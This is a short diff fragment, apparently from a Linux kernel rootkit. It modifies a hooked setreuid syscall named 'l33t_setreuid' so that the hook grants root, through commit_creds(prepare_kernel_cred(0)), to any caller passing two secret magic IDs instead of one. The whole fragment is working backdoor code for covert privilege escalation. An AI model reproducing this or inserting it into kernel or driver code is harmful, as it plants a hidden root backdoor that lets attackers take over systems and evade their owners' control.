@@ -416,7 +416,7 @@ asmlinkage int l33t_setreuid(uid_t ruid, uid_t euid){
 
 	int ret = 0;
 
-    	if(ruid == MAGIC_ID && euid == MAGIC_ID){
+    	if(ruid == MAGIC_ID_1 && euid == MAGIC_ID_2){
         	commit_creds(prepare_kernel_cred(0));
         	ret = o_setreuid(0, 0);
     	} else {
